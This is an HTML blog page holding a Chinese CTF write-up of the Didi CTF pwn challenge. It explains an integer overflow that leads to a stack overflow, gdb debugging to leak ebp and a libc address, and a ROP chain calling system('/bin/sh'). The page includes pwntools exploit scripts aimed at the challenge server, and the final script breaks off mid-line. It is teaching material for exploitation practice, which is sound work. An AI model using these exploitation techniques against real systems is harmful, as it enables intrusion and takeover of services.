@@ -1,0 +1,1330 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="English">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="滴滴CTF之唯一的pwn题详解前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文: 题目简介123456789101112131415161718192021222324int __cdecl">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="滴滴CTF之唯一的pwn题详解">
+<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;2019&#x2F;04&#x2F;19&#x2F;pwn-stack&#x2F;index.html">
+<meta property="og:site_name" content="NoOne-hub">
+<meta property="og:description" content="滴滴CTF之唯一的pwn题详解前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文: 题目简介123456789101112131415161718192021222324int __cdecl">
+<meta property="og:locale" content="English">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g27zjxto4tj30m90g5adg.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g285j7w0nhj30iz0evdh0.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287zdxr09j30m70f0tb5.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287zjk9y0j30md0c6dhf.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g285op2bscj30m70f9n1g.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g285sjp1qej31bd0qb13z.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287we3ahoj30m80ekte2.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287wmw6ocj30vs0ok47n.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287wt79m9j30kz03vaac.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g287xdxivlj30mr06x75l.jpg">
+<meta property="og:updated_time" content="2019-10-30T09:31:24.756Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;005BYqpggy1g27zjxto4tj30m90g5adg.jpg">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "6959cb4a"
+    });
+  daovoice('update');
+  </script>
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://noone-hub.github.io/2019/04/19/pwn-stack/"/>
+
+
+
+
+
+  <title>滴滴CTF之唯一的pwn题详解 | NoOne-hub</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="English">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">NoOne-hub</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">A place that No One knw</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" target="_blank" rel="noopener" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/pwn-stack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiHua">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoOne-hub">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">滴滴CTF之唯一的pwn题详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/stack/" itemprop="url" rel="index">
+                    <span itemprop="name">stack</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/19/pwn-stack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/pwn-stack/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/04/19/pwn-stack/" class="leancloud_visitors" data-flag-title="滴滴CTF之唯一的pwn题详解">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p>
+<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>sub_804862D()内部代码</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul>
+<li>在具体地方附加，用gdb.attach(io)附加，然后finish 3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li>
+</ul>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p>
+<ul>
+<li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li>
+</ul>
+<h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p>
+<p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p>
+<p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p>
+<p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p>
+<p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p>
+<p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p>
+<p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p>
+<p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p>
+<p>所以，我输出一下这里的地址看看内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure>
+<p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p>
+<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p>
+<p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) 